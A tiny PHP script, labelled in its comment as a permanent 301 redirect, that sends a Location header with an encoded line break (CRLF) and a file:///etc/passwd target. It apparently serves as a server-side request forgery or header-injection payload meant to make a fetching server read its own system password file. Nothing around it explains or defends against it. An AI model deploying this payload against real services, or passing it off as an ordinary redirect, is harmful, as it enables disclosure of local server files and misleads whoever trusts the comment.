<?php // Permanent 301 Redirect via PHP
	header("HTTP/1.1 301 Moved Permanently");
	header("Location: %0D%0Afile:///etc/passwd");
	exit();
?>
